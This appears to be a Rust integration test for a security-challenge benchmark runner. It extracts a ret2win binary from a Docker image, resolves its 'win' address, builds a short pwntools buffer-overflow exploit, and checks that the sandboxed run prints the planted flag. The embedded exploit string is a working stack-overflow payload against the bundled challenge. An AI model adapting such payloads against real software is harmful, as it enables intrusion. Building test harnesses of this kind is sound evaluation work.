//! Optional proof of the current Rust sandbox against the locally cached
//! example challenge images. Run explicitly with cargo test --test live_docker -- --ignored.
use scb_runner::sandbox::{DockerCli, RunParams, SandboxExecutor};
use std::{io::Write, path::PathBuf, process::Command};
use tempfile::TempDir;
use zip::write::SimpleFileOptions;

#[tokio::test]
#[ignore = "requires local Docker and scb-target/scb-runtime images"]
async fn rust_docker_executor_reads_the_private_flag_and_cleans_up() {
    let docker = |args: &[&str]| {
        let result = Command::new("docker")
            .args(args)
            .output()
            .expect("Docker CLI");
        assert!(result.status.success(), "Docker command failed");
        result
    };
    docker(&["image", "inspect", "scb-target:latest"]);
    docker(&["image", "inspect", "scb-runtime:latest"]);

    let temp = TempDir::new().unwrap();
    let work = TempDir::new().unwrap();
    let rootfs = TempDir::new().unwrap();
    let flag = "flag{rust_docker_smoke}";
    std::fs::write(rootfs.path().join("flag"), flag).unwrap();

    let container = String::from_utf8(docker(&["create", "scb-target:latest"]).stdout)
        .unwrap()
        .trim()
        .to_owned();
    let binary_path = temp.path().join("ret2win");
    let source = format!("{container}:/app/ret2win");
    let copied = Command::new("docker")
        .args(["cp", &source, binary_path.to_str().unwrap()])
        .status()
        .unwrap();
    assert!(copied.success(), "could not read example target binary");
    docker(&["rm", &container]);

    let symbols = Command::new("nm")
        .args(["-n", binary_path.to_str().unwrap()])
        .output()
        .unwrap();
    assert!(symbols.status.success());
    let win = String::from_utf8(symbols.stdout)
        .unwrap()
        .lines()
        .find_map(|line| {
            let mut fields = line.split_whitespace();
            let address = fields.next()?;
            (fields.nth(1)? == "win").then(|| u64::from_str_radix(address, 16).unwrap())
        })
        .expect("example target win symbol");
    let exploit = format!(
        "from pwn import remote,p64\np=remote('target',1337)\np.recvline()\np.send(b'A'*40+p64({win}))\nprint(p.recvall(timeout=5).decode(errors='replace'))\n"
    );
    let archive_path = temp.path().join("exploit.zip");
    let archive = std::fs::File::create(&archive_path).unwrap();
    let mut zip = zip::ZipWriter::new(archive);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    zip.start_file("exploit.py", options).unwrap();
    zip.write_all(exploit.as_bytes()).unwrap();
    let archive = zip.finish().unwrap();
    assert!(
        archive.metadata().unwrap().len() <= 9000,
        "example exploit exceeds upload cap"
    );

    let mut exploit_workspace =
        scb_runner::unpack::ExploitWorkspace::new(work.path(), 2 * 1024 * 1024).unwrap();
    let unpacked = exploit_workspace
        .unpack_zip(
            &std::fs::read(archive_path).unwrap(),
            &scb_runner::unpack::ExploitZipLimits::default(),
        )
        .unwrap();
    let network = format!("scb-live-{}", std::process::id());
    let sandbox = DockerCli {
        executable: PathBuf::from("docker"),
        runtime_image: "scb-runtime:latest".into(),
        network: network.clone(),
        ..DockerCli::default()
    };
    let params = RunParams {
        rootfs_dir: rootfs.path(),
        work_dir: exploit_workspace.path(),
        exploit_entrypoint: &unpacked.entrypoint,
        env_blob_path: None,
        target_image: Some("scb-target:latest".into()),
        target_entrypoint: vec!["/app/serve.sh".into()],
        target_host: "target".into(),
        target_network: network.clone(),
        target_port: 1337,
        timeout_secs: 20,
        memory_mb: 512,
        cpus: 1.0,
        // This constrained workstation denies the setarch personality syscall;
        // the bundled challenge is static/no-PIE so its win address is fixed.
        aslr_off: false,
        seed: 0,
    };
    let outcome = sandbox.run_exploit(&params).await.unwrap();
    let _ = Command::new("docker")
        .args(["network", "rm", &network])
        .output();
    assert!(
        outcome.output.contains(flag),
        "expected exploit success: {}",
        outcome.output.replace(flag, "[REDACTED]")
    );
    assert!(!outcome.timed_out);
}
